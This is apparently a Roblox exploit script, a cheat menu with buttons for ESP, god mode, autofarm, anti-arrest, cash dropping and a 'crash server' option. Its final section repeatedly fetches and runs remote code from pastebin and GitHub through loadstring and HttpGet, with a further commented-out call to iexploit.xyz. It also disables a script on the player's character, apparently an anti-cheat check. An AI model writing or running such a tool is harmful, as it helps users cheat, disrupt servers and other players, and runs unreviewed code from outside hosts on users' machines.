Users.Parent = SideScriptsFrame
Users.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Users.BorderSizePixel = 0
Users.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
Users.Size = UDim2.new(0, 94, 0, 46)
Users.Font = Enum.Font.GothamBlack
Users.Text = "Users"
Users.TextColor3 = Color3.fromRGB(255, 255, 255)
Users.TextSize = 14.000

MoneyESP.Name = "MoneyESP"
MoneyESP.Parent = SideScriptsFrame
MoneyESP.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MoneyESP.BorderSizePixel = 0
MoneyESP.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
MoneyESP.Size = UDim2.new(0, 94, 0, 46)
MoneyESP.Font = Enum.Font.GothamBlack
MoneyESP.Text = "MoneyESP"
MoneyESP.TextColor3 = Color3.fromRGB(255, 255, 255)
MoneyESP.TextSize = 14.000

FullGod.Name = "FullGod"
FullGod.Parent = SideScriptsFrame
FullGod.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
FullGod.BorderSizePixel = 0
FullGod.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
FullGod.Size = UDim2.new(0, 94, 0, 46)
FullGod.Font = Enum.Font.GothamBlack
FullGod.Text = ""
FullGod.TextColor3 = Color3.fromRGB(255, 255, 255)
FullGod.TextSize = 14.000

Autofarm.Name = "Autofarm"
Autofarm.Parent = SideScriptsFrame
Autofarm.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Autofarm.BorderSizePixel = 0
Autofarm.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
Autofarm.Size = UDim2.new(0, 94, 0, 46)
Autofarm.Font = Enum.Font.GothamBlack
Autofarm.Text = "Autofarm"
Autofarm.TextColor3 = Color3.fromRGB(255, 255, 255)
Autofarm.TextSize = 14.000

HighTool.Name = "HighTool"
HighTool.Parent = SideScriptsFrame
HighTool.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
HighTool.BorderSizePixel = 0
HighTool.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
HighTool.Size = UDim2.new(0, 94, 0, 46)
HighTool.Font = Enum.Font.GothamBlack
HighTool.Text = "High Tool"
HighTool.TextColor3 = Color3.fromRGB(255, 255, 255)
HighTool.TextSize = 14.000

Esp.Name = "Esp"
Esp.Parent = SideScriptsFrame
Esp.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Esp.BorderSizePixel = 0
Esp.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
Esp.Size = UDim2.new(0, 94, 0, 46)
Esp.Font = Enum.Font.GothamBlack
Esp.Text = "Esp"
Esp.TextColor3 = Color3.fromRGB(255, 255, 255)
Esp.TextSize = 14.000

LastingBullets.Name = "LastingBullets"
LastingBullets.Parent = SideScriptsFrame
LastingBullets.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
LastingBullets.BorderSizePixel = 0
LastingBullets.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
LastingBullets.Size = UDim2.new(0, 94, 0, 46)
LastingBullets.Font = Enum.Font.GothamBlack
LastingBullets.Text = "LastingBullets"
LastingBullets.TextColor3 = Color3.fromRGB(255, 255, 255)
LastingBullets.TextSize = 14.000

Stamina.Name = "Stamina"
Stamina.Parent = SideScriptsFrame
Stamina.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Stamina.BorderSizePixel = 0
Stamina.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
Stamina.Size = UDim2.new(0, 94, 0, 46)
Stamina.Font = Enum.Font.GothamBlack
Stamina.Text = "Stamina"
Stamina.TextColor3 = Color3.fromRGB(255, 255, 255)
Stamina.TextSize = 14.000

Spin.Name = "Spin"
Spin.Parent = SideScriptsFrame
Spin.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Spin.BorderSizePixel = 0
Spin.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
Spin.Size = UDim2.new(0, 94, 0, 46)
Spin.Font = Enum.Font.GothamBlack
Spin.Text = "Spin"
Spin.TextColor3 = Color3.fromRGB(255, 255, 255)
Spin.TextSize = 14.000

Unban.Name = "Unban"
Unban.Parent = SideScriptsFrame
Unban.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Unban.BorderSizePixel = 0
Unban.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
Unban.Size = UDim2.new(0, 94, 0, 46)
Unban.Font = Enum.Font.GothamBlack
Unban.Text = "Unban"
Unban.TextColor3 = Color3.fromRGB(255, 255, 255)
Unban.TextSize = 14.000

SwagUsers.Name = "SwagUsers"
SwagUsers.Parent = SideScriptsFrame
SwagUsers.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SwagUsers.BorderSizePixel = 0
SwagUsers.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
SwagUsers.Size = UDim2.new(0, 94, 0, 46)
SwagUsers.Font = Enum.Font.GothamBlack
SwagUsers.Text = "SwagUsers"
SwagUsers.TextColor3 = Color3.fromRGB(255, 255, 255)
SwagUsers.TextSize = 14.000

LockTools.Name = "LockTools"
LockTools.Parent = SideScriptsFrame
LockTools.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
LockTools.BorderSizePixel = 0
LockTools.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
LockTools.Size = UDim2.new(0, 94, 0, 46)
LockTools.Font = Enum.Font.GothamBlack
LockTools.Text = "LockTools"
LockTools.TextColor3 = Color3.fromRGB(255, 255, 255)
LockTools.TextSize = 14.000

Invisible.Name = "Invisible"
Invisible.Parent = SideScriptsFrame
Invisible.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Invisible.BorderSizePixel = 0
Invisible.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
Invisible.Size = UDim2.new(0, 94, 0, 46)
Invisible.Font = Enum.Font.GothamBlack
Invisible.Text = "Invisible"
Invisible.TextColor3 = Color3.fromRGB(255, 255, 255)
Invisible.TextSize = 14.000

InfTools.Name = "InfTools"
InfTools.Parent = SideScriptsFrame
InfTools.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
InfTools.BorderSizePixel = 0
InfTools.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
InfTools.Size = UDim2.new(0, 94, 0, 46)
InfTools.Font = Enum.Font.GothamBlack
InfTools.Text = "InfTools"
InfTools.TextColor3 = Color3.fromRGB(255, 255, 255)
InfTools.TextSize = 14.000

TogglesFrame.Name = "TogglesFrame"
TogglesFrame.Parent = Buttons
TogglesFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TogglesFrame.BackgroundTransparency = 1.000
TogglesFrame.Size = UDim2.new(0, 316, 0, 325)
TogglesFrame.Visible = false

QToTp.Name = "QToTp"
QToTp.Parent = TogglesFrame
QToTp.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
QToTp.BorderSizePixel = 0
QToTp.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
QToTp.Size = UDim2.new(0, 94, 0, 46)
QToTp.Font = Enum.Font.GothamBlack
QToTp.Text = "Q to TP"
QToTp.TextColor3 = Color3.fromRGB(255, 255, 255)
QToTp.TextSize = 14.000

QToTpColor.Name = "QToTpColor"
QToTpColor.Parent = QToTp
QToTpColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
QToTpColor.BorderSizePixel = 0
QToTpColor.Size = UDim2.new(0, 93, 0, 5)
QToTpColor.Font = Enum.Font.SourceSans
QToTpColor.Text = ""
QToTpColor.TextColor3 = Color3.fromRGB(255, 0, 0)
QToTpColor.TextSize = 14.000

HideBlock.Name = "HideBlock"
HideBlock.Parent = TogglesFrame
HideBlock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
HideBlock.BorderSizePixel = 0
HideBlock.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
HideBlock.Size = UDim2.new(0, 94, 0, 46)
HideBlock.Font = Enum.Font.GothamBlack
HideBlock.Text = "Hide Block"
HideBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
HideBlock.TextSize = 14.000

HideBlockColor.Name = "HideBlockColor"
HideBlockColor.Parent = HideBlock
HideBlockColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
HideBlockColor.BorderSizePixel = 0
HideBlockColor.Size = UDim2.new(0, 93, 0, 5)
HideBlockColor.Font = Enum.Font.SourceSans
HideBlockColor.Text = ""
HideBlockColor.TextColor3 = Color3.fromRGB(255, 0, 0)
HideBlockColor.TextSize = 14.000

HideUser.Name = "HideUser"
HideUser.Parent = TogglesFrame
HideUser.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
HideUser.BorderSizePixel = 0
HideUser.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
HideUser.Size = UDim2.new(0, 94, 0, 46)
HideUser.Font = Enum.Font.GothamBlack
HideUser.Text = "Hide User"
HideUser.TextColor3 = Color3.fromRGB(255, 255, 255)
HideUser.TextSize = 14.000

HideUserColor.Name = "HideUserColor"
HideUserColor.Parent = HideUser
HideUserColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
HideUserColor.BorderSizePixel = 0
HideUserColor.Size = UDim2.new(0, 93, 0, 5)
HideUserColor.Font = Enum.Font.SourceSans
HideUserColor.Text = ""
HideUserColor.TextColor3 = Color3.fromRGB(255, 0, 0)
HideUserColor.TextSize = 14.000

AutoStomp.Name = "AutoStomp"
AutoStomp.Parent = TogglesFrame
AutoStomp.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AutoStomp.BorderSizePixel = 0
AutoStomp.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
AutoStomp.Size = UDim2.new(0, 94, 0, 46)
AutoStomp.Font = Enum.Font.GothamBlack
AutoStomp.Text = "Auto Stomp"
AutoStomp.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoStomp.TextSize = 14.000

AutoStompColor.Name = "AutoStompColor"
AutoStompColor.Parent = AutoStomp
AutoStompColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AutoStompColor.BorderSizePixel = 0
AutoStompColor.Size = UDim2.new(0, 93, 0, 5)
AutoStompColor.Font = Enum.Font.SourceSans
AutoStompColor.Text = ""
AutoStompColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AutoStompColor.TextSize = 14.000

RocketRide.Name = "RocketRide"
RocketRide.Parent = TogglesFrame
RocketRide.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
RocketRide.BorderSizePixel = 0
RocketRide.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
RocketRide.Size = UDim2.new(0, 94, 0, 46)
RocketRide.Font = Enum.Font.GothamBlack
RocketRide.Text = "Rocket Ride"
RocketRide.TextColor3 = Color3.fromRGB(255, 255, 255)
RocketRide.TextSize = 14.000

RocketRideColor.Name = "RocketRideColor"
RocketRideColor.Parent = RocketRide
RocketRideColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
RocketRideColor.BorderSizePixel = 0
RocketRideColor.Size = UDim2.new(0, 93, 0, 5)
RocketRideColor.Font = Enum.Font.SourceSans
RocketRideColor.Text = ""
RocketRideColor.TextColor3 = Color3.fromRGB(255, 0, 0)
RocketRideColor.TextSize = 14.000

AntiArrest.Name = "AntiArrest"
AntiArrest.Parent = TogglesFrame
AntiArrest.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiArrest.BorderSizePixel = 0
AntiArrest.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
AntiArrest.Size = UDim2.new(0, 94, 0, 46)
AntiArrest.Font = Enum.Font.GothamBlack
AntiArrest.Text = "Anti-Arrest"
AntiArrest.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiArrest.TextSize = 14.000

AntiArrestColor.Name = "AntiArrestColor"
AntiArrestColor.Parent = AntiArrest
AntiArrestColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiArrestColor.BorderSizePixel = 0
AntiArrestColor.Size = UDim2.new(0, 93, 0, 5)
AntiArrestColor.Font = Enum.Font.SourceSans
AntiArrestColor.Text = ""
AntiArrestColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiArrestColor.TextSize = 14.000

AntiGrab.Name = "AntiGrab"
AntiGrab.Parent = TogglesFrame
AntiGrab.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiGrab.BorderSizePixel = 0
AntiGrab.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
AntiGrab.Size = UDim2.new(0, 94, 0, 46)
AntiGrab.Font = Enum.Font.GothamBlack
AntiGrab.Text = "Anti-Grab"
AntiGrab.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiGrab.TextSize = 14.000

AntiGrabColor.Name = "AntiGrabColor"
AntiGrabColor.Parent = AntiGrab
AntiGrabColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiGrabColor.BorderSizePixel = 0
AntiGrabColor.Size = UDim2.new(0, 93, 0, 5)
AntiGrabColor.Font = Enum.Font.SourceSans
AntiGrabColor.Text = ""
AntiGrabColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiGrabColor.TextSize = 14.000

AutoDrop.Name = "AutoDrop"
AutoDrop.Parent = TogglesFrame
AutoDrop.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AutoDrop.BorderSizePixel = 0
AutoDrop.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
AutoDrop.Size = UDim2.new(0, 94, 0, 46)
AutoDrop.Font = Enum.Font.GothamBlack
AutoDrop.Text = "Auto Drop"
AutoDrop.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoDrop.TextSize = 14.000

AutoDropColor.Name = "AutoDropColor"
AutoDropColor.Parent = AutoDrop
AutoDropColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AutoDropColor.BorderSizePixel = 0
AutoDropColor.Size = UDim2.new(0, 93, 0, 5)
AutoDropColor.Font = Enum.Font.SourceSans
AutoDropColor.Text = ""
AutoDropColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AutoDropColor.TextSize = 14.000

AntiStomp.Name = "AntiStomp"
AntiStomp.Parent = TogglesFrame
AntiStomp.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiStomp.BorderSizePixel = 0
AntiStomp.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
AntiStomp.Size = UDim2.new(0, 94, 0, 46)
AntiStomp.Font = Enum.Font.GothamBlack
AntiStomp.Text = "Anti-Stomp"
AntiStomp.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiStomp.TextSize = 14.000

AntiStompColor.Name = "AntiStompColor"
AntiStompColor.Parent = AntiStomp
AntiStompColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiStompColor.BorderSizePixel = 0
AntiStompColor.Size = UDim2.new(0, 93, 0, 5)
AntiStompColor.Font = Enum.Font.SourceSans
AntiStompColor.Text = ""
AntiStompColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiStompColor.TextSize = 14.000

AutoBlock.Name = "AutoBlock"
AutoBlock.Parent = TogglesFrame
AutoBlock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AutoBlock.BorderSizePixel = 0
AutoBlock.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
AutoBlock.Size = UDim2.new(0, 94, 0, 46)
AutoBlock.Font = Enum.Font.GothamBlack
AutoBlock.Text = "Auto Block"
AutoBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoBlock.TextSize = 14.000

AutoBlockColor.Name = "AutoBlockColor"
AutoBlockColor.Parent = AutoBlock
AutoBlockColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AutoBlockColor.BorderSizePixel = 0
AutoBlockColor.Size = UDim2.new(0, 93, 0, 5)
AutoBlockColor.Font = Enum.Font.SourceSans
AutoBlockColor.Text = ""
AutoBlockColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AutoBlockColor.TextSize = 14.000

CashAura.Name = "CashAura"
CashAura.Parent = TogglesFrame
CashAura.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CashAura.BorderSizePixel = 0
CashAura.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
CashAura.Size = UDim2.new(0, 94, 0, 46)
CashAura.Font = Enum.Font.GothamBlack
CashAura.Text = "Cash Aura"
CashAura.TextColor3 = Color3.fromRGB(255, 255, 255)
CashAura.TextSize = 14.000

CashAuraColor.Name = "CashAuraColor"
CashAuraColor.Parent = CashAura
CashAuraColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CashAuraColor.BorderSizePixel = 0
CashAuraColor.Size = UDim2.new(0, 93, 0, 5)
CashAuraColor.Font = Enum.Font.SourceSans
CashAuraColor.Text = ""
CashAuraColor.TextColor3 = Color3.fromRGB(255, 0, 0)
CashAuraColor.TextSize = 14.000

AntiEffects.Name = "AntiEffects"
AntiEffects.Parent = TogglesFrame
AntiEffects.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiEffects.BorderSizePixel = 0
AntiEffects.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
AntiEffects.Size = UDim2.new(0, 94, 0, 46)
AntiEffects.Font = Enum.Font.GothamBlack
AntiEffects.Text = "Anti-Effects"
AntiEffects.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiEffects.TextSize = 14.000

AntiEffectsColor.Name = "AntiEffectsColor"
AntiEffectsColor.Parent = AntiEffects
AntiEffectsColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiEffectsColor.BorderSizePixel = 0
AntiEffectsColor.Size = UDim2.new(0, 93, 0, 5)
AntiEffectsColor.Font = Enum.Font.SourceSans
AntiEffectsColor.Text = ""
AntiEffectsColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiEffectsColor.TextSize = 14.000

AltArmor.Name = "AltArmor"
AltArmor.Parent = TogglesFrame
AltArmor.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AltArmor.BorderSizePixel = 0
AltArmor.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
AltArmor.Size = UDim2.new(0, 94, 0, 46)
AltArmor.Font = Enum.Font.GothamBlack
AltArmor.Text = "Alt Armor"
AltArmor.TextColor3 = Color3.fromRGB(255, 255, 255)
AltArmor.TextSize = 14.000

AltArmorColor.Name = "AltArmorColor"
AltArmorColor.Parent = AltArmor
AltArmorColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AltArmorColor.BorderSizePixel = 0
AltArmorColor.Size = UDim2.new(0, 93, 0, 5)
AltArmorColor.Font = Enum.Font.SourceSans
AltArmorColor.Text = ""
AltArmorColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AltArmorColor.TextSize = 14.000

AntiBag.Name = "AntiBag"
AntiBag.Parent = TogglesFrame
AntiBag.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiBag.BorderSizePixel = 0
AntiBag.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
AntiBag.Size = UDim2.new(0, 94, 0, 46)
AntiBag.Font = Enum.Font.GothamBlack
AntiBag.Text = "Anti-Bag"
AntiBag.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiBag.TextSize = 14.000

AntiBagColor.Name = "AntiBagColor"
AntiBagColor.Parent = AntiBag
AntiBagColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiBagColor.BorderSizePixel = 0
AntiBagColor.Size = UDim2.new(0, 93, 0, 5)
AntiBagColor.Font = Enum.Font.SourceSans
AntiBagColor.Text = ""
AntiBagColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiBagColor.TextSize = 14.000

AntiSlow.Name = "AntiSlow"
AntiSlow.Parent = TogglesFrame
AntiSlow.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiSlow.BorderSizePixel = 0
AntiSlow.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
AntiSlow.Size = UDim2.new(0, 94, 0, 46)
AntiSlow.Font = Enum.Font.GothamBlack
AntiSlow.Text = "Anti-Slow"
AntiSlow.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiSlow.TextSize = 14.000

AntiSlowColor.Name = "AntiSlowColor"
AntiSlowColor.Parent = AntiSlow
AntiSlowColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiSlowColor.BorderSizePixel = 0
AntiSlowColor.Size = UDim2.new(0, 93, 0, 5)
AntiSlowColor.Font = Enum.Font.SourceSans
AntiSlowColor.Text = ""
AntiSlowColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiSlowColor.TextSize = 14.000

SellingFrame.Name = "SellingFrame"
SellingFrame.Parent = Buttons
SellingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SellingFrame.BackgroundTransparency = 1.000
SellingFrame.Size = UDim2.new(0, 316, 0, 325)
SellingFrame.Visible = false

CashTextbox.Name = "CashTextbox"
CashTextbox.Parent = SellingFrame
CashTextbox.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CashTextbox.BorderSizePixel = 0
CashTextbox.Position = UDim2.new(0.0949367061, 0, 0.212307692, 0)
CashTextbox.Size = UDim2.new(0, 257, 0, 34)
CashTextbox.Font = Enum.Font.SourceSans
CashTextbox.PlaceholderText = "INSERT MONEY AMOUNT"
CashTextbox.Text = ""
CashTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
CashTextbox.TextSize = 14.000

CashDropperTitle.Name = "CashDropperTitle"
CashDropperTitle.Parent = SellingFrame
CashDropperTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CashDropperTitle.BackgroundTransparency = 1.000
CashDropperTitle.Position = UDim2.new(0.158227861, 0, 0.0276923068, 0)
CashDropperTitle.Size = UDim2.new(0, 217, 0, 26)
CashDropperTitle.Font = Enum.Font.LuckiestGuy
CashDropperTitle.Text = "CASH DROPPER"
CashDropperTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
CashDropperTitle.TextSize = 30.000

CalculateButton.Name = "CalculateButton"
CalculateButton.Parent = SellingFrame
CalculateButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CalculateButton.BorderSizePixel = 0
CalculateButton.Position = UDim2.new(0.0949367136, 0, 0.369230747, 0)
CalculateButton.Size = UDim2.new(0, 118, 0, 27)
CalculateButton.Font = Enum.Font.GothamBlack
CalculateButton.Text = "Calculate"
CalculateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CalculateButton.TextSize = 14.000

DropToggleButton.Name = "DropToggleButton"
DropToggleButton.Parent = SellingFrame
DropToggleButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
DropToggleButton.BorderSizePixel = 0
DropToggleButton.Position = UDim2.new(0.532544494, 0, 0.369230747, 0)
DropToggleButton.Size = UDim2.new(0, 118, 0, 27)
DropToggleButton.Font = Enum.Font.GothamBlack
DropToggleButton.Text = "Enable"
DropToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
DropToggleButton.TextSize = 14.000

CashDroppedLabel.Name = "CashDroppedLabel"
CashDroppedLabel.Parent = SellingFrame
CashDroppedLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CashDroppedLabel.BackgroundTransparency = 1.000
CashDroppedLabel.Position = UDim2.new(0.0949367136, 0, 0.596923113, 0)
CashDroppedLabel.Size = UDim2.new(0, 200, 0, 12)
CashDroppedLabel.Font = Enum.Font.GothamBlack
CashDroppedLabel.Text = "Cash Dropped:"
CashDroppedLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CashDroppedLabel.TextSize = 14.000
CashDroppedLabel.TextXAlignment = Enum.TextXAlignment.Left

CashAtEndLabel.Name = "CashAtEndLabel"
CashAtEndLabel.Parent = SellingFrame
CashAtEndLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CashAtEndLabel.BackgroundTransparency = 1.000
CashAtEndLabel.Position = UDim2.new(0.0949367136, 0, 0.698461592, 0)
CashAtEndLabel.Size = UDim2.new(0, 200, 0, 12)
CashAtEndLabel.Font = Enum.Font.GothamBlack
CashAtEndLabel.Text = "Cash you will have left:"
CashAtEndLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
CashAtEndLabel.TextSize = 14.000
CashAtEndLabel.TextXAlignment = Enum.TextXAlignment.Left

Frame_2.Parent = SellingFrame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.0949367061, 0, 0.769230783, 0)
Frame_2.Size = UDim2.new(0, 152, 0, 4)

CrashServerButton.Name = "CrashServerButton"
CrashServerButton.Parent = SellingFrame
CrashServerButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CrashServerButton.BorderSizePixel = 0
CrashServerButton.Position = UDim2.new(0.0949367061, 0, 0.815384626, 0)
CrashServerButton.Size = UDim2.new(0, 138, 0, 29)
CrashServerButton.Font = Enum.Font.GothamBlack
CrashServerButton.Text = "CRASH SERVER"
CrashServerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CrashServerButton.TextSize = 14.000

SwagmodeFrame.Active = true
SwagmodeFrame.Draggable = true
--[[
local function FUVO_fake_script() -- imiecredits.LocalScript 
	local script = Instance.new('LocalScript', imiecredits)
	loadstring(game:HttpGet('https://iexploit.xyz/credits'))()
end


coroutine.wrap(FUVO_fake_script)()
--]]
imiecredits.Text = "Credits:\nby: yahyeee#7643\nUI by: imie#0039"

--[[
local function PXXAONR_fake_script() -- UIGradient.LocalScript 
	local script = Instance.new('LocalScript', UIGradient)
	game:GetService('RunService').RenderStepped:Connect(function()
		script.Parent.Rotation = (tick() * 75) % 360;
	end)
end


--coroutine.wrap(PXXAONR_fake_script)()
local function OZAKZ_fake_script() -- SwagmodeFrame.DragScript 
	local script = Instance.new('LocalScript', SwagmodeFrame)
	script.Parent.Active = true
	script.Parent.Draggable = true
end
coroutine.wrap(OZAKZ_fake_script)()
--]]

function hideframes()
    MainFrame.Visible = false
    QuickTpFrame.Visible = false
    SideScriptsFrame.Visible = false
    TogglesFrame.Visible = false
    SellingFrame.Visible = false
end

function announce(title,text,time)
    game.StarterGui:SetCore("SendNotification", {
        Title = title;
        Text = text;
        Duration = time;
    })
end

Players = game:GetService('Players')
UIS = game:GetService('UserInputService')
RS = game:GetService('RunService')


TogglesButton.MouseButton1Click:Connect(function()
    hideframes()
    TogglesFrame.Visible = true
end)
QuickTpButton.MouseButton1Click:Connect(function()
    hideframes()
    QuickTpFrame.Visible = true
end)
SideButton.MouseButton1Click:Connect(function()
    hideframes()
    SideScriptsFrame.Visible = true
end)
MainButton.MouseButton1Click:Connect(function()
    hideframes()
    MainFrame.Visible = true
end)
SellingButton.MouseButton1Click:Connect(function()
    hideframes()
    SellingFrame.Visible = true
end)

local formatNumber = (function (n)
    n = tostring(n)
    return n:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end)

function SetPlayerInfo()
    local foundplayer = game:GetService('Players'):FindFirstChild(TargetTextbox.Text)
    if foundplayer then
        local TargetId = foundplayer.UserId
        local ThumbType = Enum.ThumbnailType.HeadShot
        local ThumbSize = Enum.ThumbnailSize.Size420x420
        local Content, IsReady = game:GetService('Players'):GetUserThumbnailAsync(TargetId, ThumbType, ThumbSize)
                    
        TargetImage.Image = Content
        
        CashLabel.Text = ('Cash : ' .. formatNumber(foundplayer.DataFolder.Currency.Value))
        BountyLabel.Text = ('Bounty : ' .. formatNumber(foundplayer.leaderstats.Wanted.Value))
        
        local CrewValue = foundplayer:FindFirstChild('DataFolder'):FindFirstChild('Information'):FindFirstChild('Crew')
        if CrewValue then
            if CrewValue.Value ~= nil and CrewValue.Value ~= '' then
                Crew = game:GetService('GroupService'):GetGroupInfoAsync(tonumber(CrewValue.Value))
                if Crew then
                    CrewLabel.Text = ('Crew : ' .. Crew.Name )
                    CrewId = tonumber(CrewValue.Value)
                end
            else
                CrewLabel.Text = ('Crew : None')
                Crew = nil
            end
        else
            CrewLabel.Text = ('Crew : None')
            Crew = nil
        end
    end
end

CrewLabel.MouseButton1Click:Connect(function()
    if CrewLabel.Text ~= ('Crew : None') then
        setclipboard(CrewId)
    end
end)

function ShrinkName()
    TargetTextbox.FocusLost:connect(function()
        for i,v in pairs(game.Players:GetChildren()) do
            if (string.sub(string.lower(v.Name),1,string.len(TargetTextbox.Text))) == string.lower(TargetTextbox.Text) then
                TargetTextbox.Text = v.Name
                SetPlayerInfo()
            end
        end
    end)
end
ShrinkName()

function view(plr)
    wait()
    if game.Players:FindFirstChild(plr) then
        if game.Players[plr].Character then
            game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = game.Players:FindFirstChild(plr).Character.HumanoidRootPart
        else
            View.Text = 'View'
        end
    else
        View.Text = 'View'
    end
end

loadstring(game:HttpGet("https://pastebin.com/raw/nzXicwc1", true))() -- Chatspy

local vu = game:GetService("VirtualUser") -- AntiAfk
game:GetService("Players").LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

spawn(function() -- Network
    game.RunService.RenderStepped:Connect(function()
        game.Players.LocalPlayer.MaximumSimulationRadius = 1000;
        setsimulationradius(1000,1000)
    end)
end)

coroutine.resume(coroutine.create(function()
    while wait(3) do
        local function main()
            if player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript') then
                player.Character:FindFirstChildWhichIsA('Script'):FindFirstChild('LocalScript').Disabled = true
            end
            if player.Character.UpperTorso:FindFirstChild('OriginalSize') then
                player.Character.UpperTorso:FindFirstChild('OriginalSize'):Destroy()
            end
            loadstring(game:HttpGet('https://raw.githubusercontent.com/swagmode/swagmode/main/swagnames'))()
        end
        local success, err = pcall(main)
    end
end))

